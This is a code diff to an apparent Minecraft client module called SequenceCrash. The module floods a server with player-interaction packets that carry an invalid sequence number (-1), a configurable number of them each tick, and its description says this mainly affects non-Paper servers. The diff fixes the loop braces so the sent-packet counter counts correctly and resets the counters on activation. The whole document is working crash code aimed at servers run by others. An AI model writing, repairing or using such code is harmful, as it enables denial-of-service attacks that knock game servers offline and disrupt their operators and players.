@@ -62,22 +62,27 @@ public class SequenceCrash extends Module {
             "Sends interactions with an invalid sequence number (-1). Mainly affects non-Paper servers.");
     }
 
+    @Override
+    public void onActivate() { ticksActive = 0; packetsSent = 0; }
+
     @EventHandler
     private void onTick(TickEvent.Post event) {
         if (mc.player == null) return;
         ticksActive++;
         switch (mode.get()) {
             case Item -> {
-                for (int i = 0; i < amount.get(); i++)
+                for (int i = 0; i < amount.get(); i++) {
                     mc.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, -1, 0f, 0f));
-            packetsSent++;
+                    packetsSent++;
+                }
             }
             case Block -> {
                 Vec3d pos = new Vec3d(mc.player.getX(), mc.player.getY(), mc.player.getZ());
                 BlockHitResult bhr = new BlockHitResult(pos, Direction.DOWN, BlockPos.ofFloored(pos), false);
-                for (int i = 0; i < amount.get(); i++)
+                for (int i = 0; i < amount.get(); i++) {
                     mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, -1));
-            packetsSent++;
+                    packetsSent++;
+                }
             }
         }
     }
